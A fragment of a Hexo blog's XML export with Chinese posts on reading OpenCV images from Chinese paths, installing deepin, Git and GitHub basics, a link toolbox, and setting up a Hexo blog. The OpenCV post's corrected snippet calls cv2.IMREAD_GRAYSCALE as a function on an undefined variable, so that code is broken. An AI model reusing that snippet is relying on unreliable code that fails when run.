rel="noopener">Adversarial Training-Fast gradient sign method</a></li><li><a href="https://towardsdatascience.com/adversarial-examples-in-deep-learning-be0b08a94953" target="_blank" rel="noopener">Adversarial examples in deep learning</a></li><li><a href="https://blog.csdn.net/cdpac/article/details/53170940" target="_blank" rel="noopener">对抗样本与对抗训练</a></li><li><a href="https://blog.csdn.net/valada/article/details/88881148" target="_blank" rel="noopener">《深度学习 卷积神经网络从入门到精通》</a></li><li><a href="https://blog.csdn.net/weiqi_fan/article/details/88213284?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task" target="_blank" rel="noopener">图像对抗样本的生成（FGSM）</a></li><li>Jia X , Wei X , Cao X , et al. ComDefend: An Efficient Image Compression Model to Defend Adversarial Examples[J]. 2018. </li><li>Szegedy C, Zaremba W, Sutskever I, et al. Intriguing properties of neural networks[J]. arXiv preprint arXiv:1312.6199, 2013.</li><li>Huang L, Joseph A D, Nelson B, et al. Adversarial machine learning[C]//Proceedings of the 4th ACM workshop on Security and artificial  intelligence. ACM, 2011: 43-58.</li><li>Goodfellow I J, Shlens J, Szegedy C. Explaining and harnessing adversarial examples[J]. arXiv preprint arXiv:1412.6572, 2014.</li><li>Moosavi-Dezfooli S M, Fawzi A, Frossard P. Deepfool: a simple and accurate method to fool deep neural networks[C]//Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition. 2016: 2574-2582.</li></ol>]]></content>
      
      
      <categories>
          
          <category> 计算机视觉 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 深度学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>opencv读取中文路径并将图片转换回原读取方法类型</title>
      <link href="2020/03/06/opencv-du-qu-zhong-wen-lu-jing/"/>
      <url>2020/03/06/opencv-du-qu-zhong-wen-lu-jing/</url>
      
        <content type="html"><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>解决opencv无法读取中文路径的问题</p><p><strong>关键词:</strong> python opencv</p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>在python 3.x中使用opencv读取图片，如图</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/blog/img1fe53f8f6cff405a69960785e4564ab.png" alt=""></p><p><center>图1</center><br>但是当图片路径中有中文则会报错</p><p>各位可以<code>print(img)</code></p><p>看看是不是返回结果是None</p><h2 id="解决办法："><a href="#解决办法：" class="headerlink" title="解决办法："></a>解决办法：</h2><p>参照 <a href="https://www.zhihu.com/question/67157462/answer/251754530" target="_blank" rel="noopener">知乎 冰不语 的回答</a> </p><pre class=" language-lang-python"><code class="language-lang-python">    ## 读取图像，解决imread不能读取中文路径的问题     def cv_imread(file_path):        cv_img = cv2.imdecode(np.fromfile(file_path, dtype=np.uint8), -1)        return cv_img</code></pre><p>但是看看图一，读取图片后面还有一个参数<code>cv2.IMREAD_GRAYSCALE</code></p><p>如果需要在后面对图片处理一些相关操作，则可能会报错（我就遇到过）</p><p>其实只需要把定义读取中文路径的函数里返回结果之前转换回一般的读取方式即可</p><pre class=" language-lang-python"><code class="language-lang-python">    ## 读取图像，解决imread不能读取中文路径的问题     def cv_imread(file_path):        cv_img = cv2.imdecode(np.fromfile(file_path, dtype=np.uint8), -1)        cv_img = cv2.IMREAD_GRAYSCALE(img)        return cv_img</code></pre><p>其他也是类似</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://www.zhihu.com/question/67157462/answer/251754530" target="_blank" rel="noopener">Python 3.x 使用 opencv 无法读取中文路径如何解决？ 冰不语 </a> </p>]]></content>
      
      
      <categories>
          
          <category> 计算机视觉 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> opencv </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>无操作系统电脑安装deepin系统</title>
      <link href="2020/02/29/an-zhuang-deepin-xi-tong/"/>
      <url>2020/02/29/an-zhuang-deepin-xi-tong/</url>
      
        <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>本篇将介绍如何在一台新的电脑(比如组装机)从只有一个BOIS系统安装deepin系统（对于安装大多数linux系统来说，都是这个思路），这跟有操作系统的电脑安装双系统是一样的，操作上都是靠bois这个基本的输入输出系统完成。</p><h2 id="可能遇上的问题"><a href="#可能遇上的问题" class="headerlink" title="可能遇上的问题"></a>可能遇上的问题</h2><p>安装Linux系统主要可能遇上的问题是<strong>显卡</strong>，因为目前个人电脑的显卡多是对windows系统定制的（苹果系统抛开另说），尽管NVIDIA和AMD有开源的显卡驱动，但是始终都是商用的性能比较好。</p><p>如果安装系统的时候<strong>显卡不怎么适配系统</strong>，那么就会导致安装完系统也无法开机。</p><h2 id="安装系统"><a href="#安装系统" class="headerlink" title="安装系统"></a>安装系统</h2><p>例如用AMD R3安装deepin系统，安装的套路是:</p><ol><li>首先准备一个储存空间8G以上的U盘，deepin官网下载<a href="https://www.deepin.org/zh/original/deepin-boot-maker/" target="_blank" rel="noopener">U盘制作工具</a>（软通碟等也可），<a href="https://www.deepin.org/zh/download/" target="_blank" rel="noopener">下载deepin系统</a>，制作U盘启动工具。</li><li>需要安装的电脑插入U盘，狂按delete键（有些电脑是esc键，每个品牌不同，具体查资料看看）进入bois系统，把U盘启动设置为首启动项。</li><li>按提示(套路)安装系统,安装完之后把进入bois系统把首启动项改回电脑系统。</li></ol><p>然鹅。。。</p><h2 id="解决显卡问题"><a href="#解决显卡问题" class="headerlink" title="解决显卡问题"></a>解决显卡问题</h2><p> 问题：在制作好deepin安装盘后，从u盘启动，选择”Install Deepin”后，会进入<strong>黑屏</strong>状态，无法显示任何内容。<br>   解决方法（禁用显卡驱动）：<strong>加启动参数’nomodeset’</strong>, 在选择界面按e或tab（底部有提示）编辑启动参数，这样一般可以进行正常安装</p><p> <img src="https://bbs.deepin.org/data/attachment/forum/201901/27/233231u74f77a0e7zh477d.png" alt="img"> </p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://bbs.deepin.org/forum.php?mod=viewthread&amp;tid=174315&amp;from=singlemessage" target="_blank" rel="noopener">AMD锐龙 2200g安装和使用deepin</a></p>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web前端爬取工具</title>
      <link href="2020/02/25/web-qian-duan-pa-qu-gong-ju/"/>
      <url>2020/02/25/web-qian-duan-pa-qu-gong-ju/</url>
      
        <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>本文介绍如何获取需要学(piao)习(qie)的网站前端资源</p><h2 id="前端爬取工具"><a href="#前端爬取工具" class="headerlink" title="前端爬取工具"></a>前端爬取工具</h2><h3 id="Teleport-Ultra"><a href="#Teleport-Ultra" class="headerlink" title="Teleport Ultra"></a>Teleport Ultra</h3><h3 id="OE7"><a href="#OE7" class="headerlink" title="OE7"></a>OE7</h3>]]></content>
      
      
      <categories>
          
          <category> tool </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Github基础操作</title>
      <link href="2020/02/24/git-yu-github/"/>
      <url>2020/02/24/git-yu-github/</url>
      
        <content type="html"><![CDATA[<p>坊间流传着“知道github的程序员歧视不知道github的程序员”。我就纳闷了：程序员还会不知道github？<br>好啦，都快要全面迈入小康社会了，再不知道github就要被消灭了[滑稽]</p><p><a href="https://blog.csdn.net/lqlqlq007/article/details/78983879" target="_blank" rel="noopener">首先要在远程仓库配置ssh</a>，然后建立远程仓库</p><p>我们常常会根据远程分支创建本地分支，命令如下</p><pre><code>git checkout -b dev origin/dev</code></pre><p>上面的命令我是想把远程分支 dev 拉到本地来，但是有时候没有用，提示远程分支不存在，我们需要通过下面的命令来操作</p><pre><code>git fetch origin</code></pre><p>可以运行 <code>git fetch origin</code> 来同步远程服务器上的数据到本地。</p><p>已经同步了分支，现在就可以拉取远程分支了</p><pre><code>git checkout -b dev origin/dev</code></pre>]]></content>
      
      
      <categories>
          
          <category> 基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tips </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git基础命令</title>
      <link href="2020/02/24/git-ji-chu-ming-ling/"/>
      <url>2020/02/24/git-ji-chu-ming-ling/</url>
      
        <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>Git是一个开源的分布式版本控制系统，现在基本上是软件开发、深度学习等各种与敲代码有关的项目都要是Git来完成版本管理了。 当然还有其他的版本控制工具，像是SVN等，但是现在基本上都是老一批的程序员大叔们在用了。</p><h2 id="为什么要用Git"><a href="#为什么要用Git" class="headerlink" title="为什么要用Git"></a>为什么要用Git</h2><p>软件开发，深度学习调参，代码肯定会有各种各种的改变，说不定这个版本还能运行，下个版本就GG了，与其找半天bug甚至根本找不出来还不如回滚旧版本。</p><p>Git有两种使用方式，Git Bash 、Git GUI </p><ul><li>Git Bash</li></ul><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/c730cd900c1d6171737c0351c49396c.png" alt=""></p><p>对于新手特别是没接触过linux的童鞋来说，一开始就用Git bash可能会挺蓝瘦。但是，我建议用Git Bash</p><ul><li><p>Git GUI</p><p>相比Git Bash，Git GUI的界面就没那么简洁啦（git bash界面确实简洁，就用户名+命令行）</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/blog/484fdb423dc5c1c555fea3d98aa88bb.png" alt="a995486c3a745d4cee7f2bdbb8557fb"></p><p>功能来说Git GUI也确实没有Git Bash灵活，唯一的好(坏)处就是不用敲命令行</p></li></ul><p>建议不管打算用Git Bash还是Git GUI都先了解下Git Bash的基础命令以便更快速地了解<strong>分布式版本控制</strong>，这里先只介绍Git Bash的基础命令</p><h2 id="安装Git"><a href="#安装Git" class="headerlink" title="安装Git"></a>安装Git</h2><p>下载并安装Git，在<code>我的电脑-鼠标右键添加属性-高级系统设置-环境变量-系统变量-Path</code>处添加变量，例如安装路径是<code>D:\Git</code>，那么就添加变量</p><p><code>D:\Git\usr\bin\</code></p><p><code>D:\Git\usr\bin\ssh-keygen.exe</code></p><p>这样就能在电脑的任意文件夹位置打开git</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/80ef2b6371e96bf39133297493ccf7e.png" alt=""></p><h2 id="本地"><a href="#本地" class="headerlink" title="本地"></a>本地</h2><h3 id="新建"><a href="#新建" class="headerlink" title="新建"></a>新建</h3><p>在你存放项目代码的文件夹，输入代码新建Git本地仓库</p><pre><code>  git init</code></pre><p>新建之后会出现一个git文件夹，并且存放项目代码的文件夹会出现一个<strong>绿色的勾</strong>,表示已经同步到本地分支；命令行用户最后面有个<strong>master</strong>，表示在本地的master分支。</p><p> 此时可以通过命令git branch查看本地分支</p><pre><code> git branch  #查看本地分支 git branch -r  #查看远程分支 git branch -a  #查看所有分支</code></pre><p>在这里先不介绍远程，先学会本地版本控制</p><p>如果需要创建其他分支，可以用切换分支的命令加上参数创建分支</p><pre><code>  git checkout dev #切换到本地的dev分支  git checkout -b dev #创建并切换到本地的dev分支</code></pre><h3 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h3><p>修改文件后，<strong>绿色的勾</strong>会变成<strong>红色的感叹号</strong>，表示更新到git的分支(如果切换到了master分支，就表示该文件没有更新到master分支，如果切换到dev分支就表示该文件没有更新到dev分支)</p><pre><code>  git add -A  #将所有文件添加到暂存区  git commit -m &quot;first commit&quot; #这一步是备注，注意这个步骤一定要有，否则会提交失败  git push -u origin master #表示提交到远程master分支，在此只是因为没有关联远程分支暂且不管</code></pre><h3 id="合并"><a href="#合并" class="headerlink" title="合并"></a>合并</h3><p>如果某个分支要更新到跟另一个分支的文件一样，使用merge</p><p>假设现在是在本地dev分支</p><pre><code>  git checkout master #切换到本地master  git merge dev #把本地dev分支合并到当前本地分支(master)中</code></pre><h3 id="关联远程"><a href="#关联远程" class="headerlink" title="关联远程"></a>关联远程</h3><pre><code>  git checkout master  git remote add origin https://github.com/coneycode/hexo-git-backup.git #使用https，之后介绍ssh  git fetch origin master #取回(名称为)origin服务器的master分支，即拉取远程master分支</code></pre><h2 id="远程"><a href="#远程" class="headerlink" title="远程"></a>远程</h2><h4 id="首次创建仓库提交"><a href="#首次创建仓库提交" class="headerlink" title="首次创建仓库提交"></a>首次创建仓库提交</h4><pre><code>git init   # 本地创建仓库 git add -A  # 提交所有文件git commit -m &quot;first commit&quot;  # 提交文件至本地缓存区git remote add origin https://github.com/githubusername/githubrepositories.git #添加远程仓库git push -u origin master #提交代码至远程仓库master分支</code></pre><h4 id="已有本地仓库提交"><a href="#已有本地仓库提交" class="headerlink" title="已有本地仓库提交"></a>已有本地仓库提交</h4><pre><code>git remote add origin https://github.com/githubusername/githubrepositories.git #添加远程仓库git push -u origin master #提交代码至远程仓库master分支</code></pre><p>如果是按照上面的方式提交，那么输入完<code>git push -u origin master</code>会弹出openssh的窗口，先输入<strong>账号名</strong>（就是仓库前的那个名字），再输入密码。每次都要这样岂不是很烦，所以推荐用SSH的方式提交。</p><h2 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h2><p>如果是使用https拉取远程分支或者提交代码的话，是要输入账号密码的，麻烦的很，但是只要使用ssh就能省去填写账号密码啦～</p><p>原理是本地生产ssh公钥和私钥，将<strong>公钥</strong>放在远程服务器（github、gitlab、coding、gitee），私钥放在本地，识别到能配对就不用填账号密码了。</p><ul><li><pre><code>  ssh-keygen -t rsa -C &quot;your_email@example.com&quot; #生产ssh密钥，文件位置在C:\Users\用户名\.ssh</code></pre></li></ul><ul><li>登录github，头像处下拉框选择settings ；</li></ul><ul><li>点击侧边栏的<code>SSH and GPG keys</code> ；</li></ul><ul><li>点击<code>New SSH key</code>,title可以任意填，并且将之前生成的 id_rsa.pub 的内容用文本编辑器打开复制到key`输入框中。</li></ul><ul><li><pre><code>  ssh -T git@github.com   #在本地电脑任意位置打开git bash输入此命令确认是否成功</code></pre><p>如果返回<code>Hi username! You’ve successfully authenticated, but GitHub does not provide shell access.</code>就说明成功啦！</p><p>接下来就可以愉快地push代码了（前提是网速行，像baidu.com都打开的网速绝对不愉快）</p></li></ul><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://git-scm.com/book/zh/v2" target="_blank" rel="noopener">git官方中文文档</a></p>]]></content>
      
      
      <categories>
          
          <category> 基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tips </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>工具箱</title>
      <link href="2020/02/23/tool/"/>
      <url>2020/02/23/tool/</url>
      
        <content type="html"><![CDATA[<h1 id="大学生必备"><a href="#大学生必备" class="headerlink" title="大学生必备"></a>大学生必备</h1><h2 id="书籍"><a href="#书籍" class="headerlink" title="书籍"></a>书籍</h2><p><a href="https://www.jiumodiary.com/" target="_blank" rel="noopener">鸠摩搜书</a></p><h2 id="翻译类"><a href="#翻译类" class="headerlink" title="翻译类"></a>翻译类</h2><p> <a href="http://dict.cnki.net/" target="_blank" rel="noopener">CNKI翻译助手</a> </p><p><a href="http://fanyi.youdao.com/" target="_blank" rel="noopener">有道在线翻译</a></p><p><a href="https://www.onlinedoctranslator.com/" target="_blank" rel="noopener">免费在线文档翻译器</a></p><p><a href="https://cn.bing.com/dict?FORM=Z9LH3" target="_blank" rel="noopener">必应词典</a></p><h2 id="文件转换"><a href="#文件转换" class="headerlink" title="文件转换"></a>文件转换</h2><p><a href="http://www.alltoall.net/" target="_blank" rel="noopener">ALL TO ALL</a> </p><p><a href="http://www.bejson.com/convert/image_to_svg/" target="_blank" rel="noopener">jpg，png转换svg</a></p><p><a href="https://cn.office-converter.com/" target="_blank" rel="noopener">office-converter</a></p><p><a href="https://convertio.co/zh/" target="_blank" rel="noopener">convertio</a></p><p><a href="https://cloudconvert.com/" target="_blank" rel="noopener">cloudconvert</a></p><p><a href="https://onlineconvertfree.com/zh/convert/" target="_blank" rel="noopener">onlineconvertfree</a></p><p><a href="https://app.xunjiepdf.com/" target="_blank" rel="noopener">迅捷PDF转换器</a></p><h2 id="论文"><a href="#论文" class="headerlink" title="论文"></a>论文</h2><p><a href="https://scholar.google.com/" target="_blank" rel="noopener">谷歌学术</a></p><p><a href="http://scholar.hedasudi.com/" target="_blank" rel="noopener">谷歌学术镜像</a></p><p><a href="https://www.aminer.cn/" target="_blank" rel="noopener">AMiner</a></p><p> <a href="https://www.ctan.org/pkg/ctex" target="_blank" rel="noopener">ctex</a></p><h1 id="开发者工具"><a href="#开发者工具" class="headerlink" title="开发者工具"></a>开发者工具</h1><h2 id="资源库"><a href="#资源库" class="headerlink" title="资源库"></a>资源库</h2><p><a href="http://www.jq22.com/" target="_blank" rel="noopener">JQurey插件库</a></p><h2 id="在线编译"><a href="#在线编译" class="headerlink" title="在线编译"></a>在线编译</h2><p><a href="https://www.json.cn/" target="_blank" rel="noopener">json解析</a></p><p><a href="http://www.bejson.com/" target="_blank" rel="noopener">json格式校验</a></p><p> <a href="https://developers.google.cn/google-ads/scripts/docs/examples/google-bigquery" target="_blank" rel="noopener">google-bigquery</a> </p><p><a href="http://www.wangeditor.com/" target="_blank" rel="noopener">富文本编辑器</a></p><p><a href="http://jsrun.pro/" target="_blank" rel="noopener">JSRUN在线编译器</a></p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><p><a href="https://dash.cloudflare.com/sign-up" target="_blank" rel="noopener">CLOUDFLARE</a></p><h1 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h1><h2 id="网盘搜索"><a href="#网盘搜索" class="headerlink" title="网盘搜索"></a>网盘搜索</h2><p><a href="http://www.pansoso.com/" target="_blank" rel="noopener">盘搜搜</a></p><h2 id="数据"><a href="#数据" class="headerlink" title="数据"></a>数据</h2><p><a href="https://toolbox.google.com/datasetsearch" target="_blank" rel="noopener">datasetsearch</a></p><p><a href="https://data.world/?newUser=true" target="_blank" rel="noopener">dataworld</a></p><p><a href="https://www.data.gov/" target="_blank" rel="noopener">datagov</a></p><p><a href="http://dataju.cn/Dataju/web/home" target="_blank" rel="noopener">聚数力</a></p><p><a href="http://hao.199it.com/" target="_blank" rel="noopener">大数据导航</a></p><p><a href="http://number.cnki.net/cyfd/" target="_blank" rel="noopener">中国宏观数据挖掘分析系统</a></p><h1 id="设计"><a href="#设计" class="headerlink" title="设计"></a>设计</h1><h2 id="素材网站"><a href="#素材网站" class="headerlink" title="素材网站"></a>素材网站</h2><p><a href="https://www.58pic.com/tupian/qianqiantuku.html" target="_blank" rel="noopener">千图网</a></p><p><a href="https://ibaotu.com/" target="_blank" rel="noopener">包图网</a></p><p><a href="http://699pic.com/" target="_blank" rel="noopener">摄图网</a></p><p><a href="http://www.nipic.com/" target="_blank" rel="noopener">昵图网</a></p><h2 id="在线设计"><a href="#在线设计" class="headerlink" title="在线设计"></a>在线设计</h2><p><a href="https://c.runoob.com/more/svgeditor/" target="_blank" rel="noopener">svg在线编辑</a></p><p><a href="https://www.logoaa.com/" target="_blank" rel="noopener">logo在线制作</a></p><p><a href="https://encycolorpedia.cn/ffffff" target="_blank" rel="noopener">RGB色彩查询</a></p><h1 id="科学上网"><a href="#科学上网" class="headerlink" title="科学上网"></a>科学上网</h1><p><a href="http://googlehelper.net/" target="_blank" rel="noopener">Ghelper</a></p><p><a href="https://www.gugeapps.net/" target="_blank" rel="noopener">chrome应用商店镜像</a></p><h1 id="综合"><a href="#综合" class="headerlink" title="综合"></a>综合</h1><h2 id="云"><a href="#云" class="headerlink" title="云"></a>云</h2><p><a href="https://www.google.com/drive/" target="_blank" rel="noopener">谷歌云端硬盘</a></p><p><a href="https://www.multcloud.com/product" target="_blank" rel="noopener">MultCloud</a></p><h2 id="工具盒"><a href="#工具盒" class="headerlink" title="工具盒"></a>工具盒</h2><p><a href="https://web.woobx.cn/" target="_blank" rel="noopener">一个木函</a></p>]]></content>
      
      
      <categories>
          
          <category> tool </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tips </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo博客搭建</title>
      <link href="2020/02/20/hexo-bo-ke-da-jian/"/>
      <url>2020/02/20/hexo-bo-ke-da-jian/</url>
      
        <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>Hexo是一种静态网页框架，可以把md文件渲染成网页文件</p><p>优点：简单易用，0成本</p><h2 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h2><ul><li>安装Git</li><li>安装Nodejs</li></ul><h3 id="安装Git"><a href="#安装Git" class="headerlink" title="安装Git"></a>安装Git</h3><p>直接<a href="https://blog.csdn.net/sanxd/article/details/82624127" target="_blank" rel="noopener">下载安装</a>，记得<code>我的电脑-属性-高级系统设置-环境变量-系统/我的环境变量</code>里添加Git的安装路径（就是告诉自己的电脑Git在哪，这样就任何一个文件夹位置都能使用Git了）</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200621220319488.png" alt="image-20200621220319488"></p><p>例如Git安装在<code>D:\Git\git-2.22.0\</code>这个位置</p><p>则环境变量里添加：</p><p><code>D:\Git\git-2.22.0\usr\bin\</code></p><p><code>D:\Git\git-2.22.0\usr\bin\ssh-keygen.exe</code></p><h3 id="安装Nodejs"><a href="#安装Nodejs" class="headerlink" title="安装Nodejs"></a>安装Nodejs</h3><p>建议新手安装最新的稳定版本，同样也得在环境变量里添加，比如安装在<code>D:\nodejs</code>就添加<code>D:\nodejs</code></p><h2 id="初始化Hexo"><a href="#初始化Hexo" class="headerlink" title="初始化Hexo"></a>初始化Hexo</h2><p>在某个文件夹位置点击鼠标右键，打开git bash，输入</p><pre><code>hexo init</code></pre><p>git会自动拉取hexo的安装包</p><p>安装完成会出现以下这些文件</p><blockquote><p>scaffolds                       配置文件，先别管</p><p>themes                          hexo主题文件</p><p>_config.yml                    hexo全局配置文件</p><p>package.json                 记录依赖包</p></blockquote><p>如果网速差点的话，git在下载landscape的时候会看住（自己看看是不是），如果是的话直接在git bash 按<kbd>Ctrl</kbd>+<kbd>C</kbd>强行终止下载（这个主题文件可以先不要，换成别的主题文件就好了，除非你喜欢hexo默认的主题）</p><p><strong>PS</strong>：配置好之后也会有一堆需要修改、美化，如果你觉得我的这个修改后的看着还行，可以直接<code>clone</code><a href="https://gitee.com/Sao-operation/hexo-matery" target="_blank" rel="noopener">本站修改后的主题配置</a></p><h2 id="配置主题"><a href="#配置主题" class="headerlink" title="配置主题"></a>配置主题</h2><p>下载主题，放到hexo目录的theme文件夹内， <a href="https://hexo.io/zh-cn/docs/themes.html" target="_blank" rel="noopener">Hexo主题下载</a> ，比如我下载Sakura主题，并且把下载的文件修改成Sakura</p><p>在hexo根目录打开_config.yml，把<code>theme: landscape</code>修改成<code>theme: Sakura</code>（注意英文冒号后面有个<strong>空格</strong>，没有的话会报错）</p><h2 id="安装插件"><a href="#安装插件" class="headerlink" title="安装插件"></a>安装插件</h2><p>安装Hexo运行必备的插件，首先安装淘宝镜像（因为npm实在太慢了）</p><p>安装cnpm，命令：</p><pre class=" language-lang-bash"><code class="language-lang-bash">npm install -g cnpm --registry=https://registry.npm.taobao.org1</code></pre><p>安装后，使用以下命令测试是否安装成功</p><pre class=" language-lang-bash"><code class="language-lang-bash">cnpm -v1</code></pre><p>成功后，以后都使用 cnpm 代替以前 npm 来执行命令！</p><ul><li>安装必要插件</li></ul><pre><code>cnpm i --save hexo-deployer-git cnpm i --save  hexo-generator-archivecnpm i --save hexo-generator-indexcnpm i --save hexo-generator-tagcnpm i --save hexo-renderer-ejscnpm i --save hexo-renderer-kramedcnpm i --save hexo-renderer-styluscnpm i --save hexo-servercnpm i --save hexo-wordcountcnpm i --save hexo-generator-category#下面的是非必要插件cnpm i --save hexo-wordcountcnpm i -S hexo-prism-plugincnpm i hexo-permalink-pinyin --savecnpm i --save hexo-generator-feedcnpm install hexo-generator-search --save</code></pre><p>然后，输入<code>`hexo g</code>，等待md文件渲染成html文件再输入<code>hexo s</code></p><p>打开浏览器输入<code>http://localhost:4000/</code></p><h2 id="定制美化"><a href="#定制美化" class="headerlink" title="定制美化"></a>定制美化</h2><p>根据自己的需要定制啦，记得多用git add -A和git commit -m “提交缓存区”  保存，万一搞得报错了至少能用git reflog回滚。</p><h2 id="图床"><a href="#图床" class="headerlink" title="图床"></a>图床</h2><p>如果网速可以建议用PicGo+github pages搭建图床（但是上传速度很慢）；也可以用七牛云、又拍云等搭建图床，但是这种我个人觉得要么收费要么不好用。</p><p><a href="../../../07/06/da-jian-tu-chuang">我用coding/gitee+pcigo</a></p><h2 id="本站修改后的主题"><a href="#本站修改后的主题" class="headerlink" title="本站修改后的主题"></a>本站修改后的主题</h2><p><a href="https://gitee.com/Sao-operation/hexo-matery" target="_blank" rel="noopener">国内仓库地址</a>，直接<code>git clone</code>下来 </p><p>在电脑上找个合适的文件夹位置(放博客的位置)</p><p>安装淘宝镜像</p><pre><code>npm install cnpm -g --registry=http://registry.npm.taobao.org #全局安装npm install cnpm --registry=http://registry.npm.taobao.org        #局部安装</code></pre><p>安装上hexo必备的一些插件</p><pre><code>cnpm i --save hexo-wordcountcnpm i --save hexo-deployer-git cnpm i -S hexo-prism-plugincnpm i hexo-permalink-pinyin --savecnpm i --save hexo-generator-feedcnpm install hexo-generator-search --savecnpm i --save  hexo-generator-archivecnpm i --save hexo-generator-indexcnpm i --save hexo-generator-tagcnpm i --save hexo-renderer-ejscnpm i --save hexo-renderer-kramedcnpm i --save hexo-renderer-styluscnpm i --save hexo-servercnpm i --save hexo-wordcountcnpm i --save hexo-generator-categorycnpm i --save hexo-filter-mermaid-diagrams</code></pre><p>然后需要修改一些必要的配置</p><p>首先在<strong>根目录</strong>的_config.yml修改自己的网站名，作者名等，url处填写自己的网站名</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200703185000368.png" alt="网站地址"></p><p>填写打开了 GitHub pages 或coding pages 的地址</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200703185323511.png" alt="开启pages的远程仓库"></p><p>如果要打开评论，这里推荐用Valine，在<strong>主题</strong>下的_config.yml，把enable的false改成true，并且注册Valine账号填写appId和appKey</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200703185504138.png" alt="评论"></p><p>另外主题配置下的github地址换成自己的github地址(还有好几个哦，自己搜索替换一下吧)</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200703185806555.png" alt="github地址"></p><p>文章的img如果没有填写，就会从指定的图片里根据哈希码选择一张图片作为封面（还是在主题配置修改）</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200703190002407.png" alt="文章封面图片"></p><h2 id="hexo中的latex踩坑"><a href="#hexo中的latex踩坑" class="headerlink" title="hexo中的latex踩坑"></a>hexo中的latex踩坑</h2><p><strong>latex换行的bug(是插件渲染的问题，可以用四个/来换行)，其他方面都没毛病。</strong>hexo-renderer-pandoc 我也尝试过，但效果还来还是不如hexo-renderer-kramed（即上面安装的那个插件）如果不想用4个/来换行也可以参考下这个<a href="https://wangcong.net/article/HexoWihLaTeX.html" target="_blank" rel="noopener">Hexo中LaTeX公式渲染</a>或<a href="https://jdhao.github.io/2017/10/06/hexo-markdown-latex-equation/" target="_blank" rel="noopener">Hexo 书写 LaTeX 公式时的一些问题及解决方法</a></p><p>（总之，hexo的latex渲染还是有点坑，但配置好其实也没毛病~推荐就用我上面指定的那些插件）</p><p>如果用typora写出来的latex有问题的话，比如像这样</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200708221444940.png" alt="Typora写的公式VScode上看起来也没毛病"></p><p>在各种markdown编辑器看着这个公式都能正常显示，但实际上经过hexo渲染打开的网页的就会像下图这样：</p><center><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200708220658307.png" width="50%"></img></center><p>这个其实是因为Typora的markdown源码不标准，所以尽管在hexo的mathjax渲染出问题</p><p>如果打开CSDN或者github的markdown编辑就会看出问题了</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200708221053504.png" alt="image-20200708221053504"></p><p>其实问题就出在typora的公式块的两个<kbd> $ $ </kbd>不是相连的，所以正确的解法是把中间的<strong>空行</strong>还有一些<strong>多余的空格</strong>删除掉即可。</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200708223051543.png" alt="$$$$中间不回车"></p><p>正常显示之后，再把这段复制粘贴到vscode打开的md文件，hexo渲染出的网页就显示正常啦。</p><p>(一句话，想办法让公式在CSDN的markdown编辑器显示正常即可)</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 建站 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>台式机DIY及组装</title>
      <link href="2020/02/20/dian-nao-tai-shi-ji-diy-ji-zu-zhuang/"/>
